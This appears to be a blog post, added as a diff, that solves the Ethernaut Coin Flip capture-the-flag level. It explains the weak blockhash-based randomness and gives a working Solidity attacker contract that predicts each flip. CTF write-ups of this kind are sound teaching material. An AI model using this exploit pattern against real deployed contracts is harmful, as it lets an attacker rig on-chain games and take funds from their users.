@@ -1,0 +1,83 @@
+---
+title: Ethernaut - Coin Flip - Solution
+date: '2024-05-05'
+tags: ['security', 'solidity', 'ctfs']
+draft: false
+summary: Solution to the Ethernaut - Coin Flip CTF
+---
+
+# Ethernaut - Coin Flip - Solution
+
+## Contract
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlip {
+    uint256 public consecutiveWins;
+    uint256 lastHash;
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor() {
+        consecutiveWins = 0;
+    }
+
+    function flip(bool _guess) public returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+
+        if (lastHash == blockValue) {
+            revert();
+        }
+
+        lastHash = blockValue;
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+
+        if (side == _guess) {
+            consecutiveWins++;
+            return true;
+        } else {
+            consecutiveWins = 0;
+            return false;
+        }
+    }
+}
+```
+
+## Exploit
+
+The goal of this challenge is to predict the coin flip 10 times in a row.
+Looking at the contract, we can see that it uses the previous block's hash as a source of "randomness".
+This pattern is what is commonly referred to as "weak random number generation (Weak RNG)" since attackers can simply use the same "random" number generation logic to predict the outcome.
+
+Take, for example, the following attacker contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract CoinFlipAttacker {
+    // FACTOR = type(uint256).max / 2 + 1
+    uint256 public constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    address public immutable VICTIM;
+
+    constructor(address victim) {
+        VICTIM = victim;
+    }
+
+    function attack() external {
+        // Use the same source of "randomness" as the victim contract
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool guess = coinFlip == 1 ? true : false;
+
+        // Flip the coin and provide the correct guess
+        (bool success, ) = VICTIM.call(abi.encodeWithSignature("flip(bool)", guess));
+        require(success, "Coin flip failed");
+    }
+}
+```
+
+Deploying this contract using [Remix](https://remix.ethereum.org) and providing our victim contract's address in the constructor, we can simply call `attack()` 10 times in a row to win the level.
+Note that these 10 calls need to be distributed over 10 different blocks.
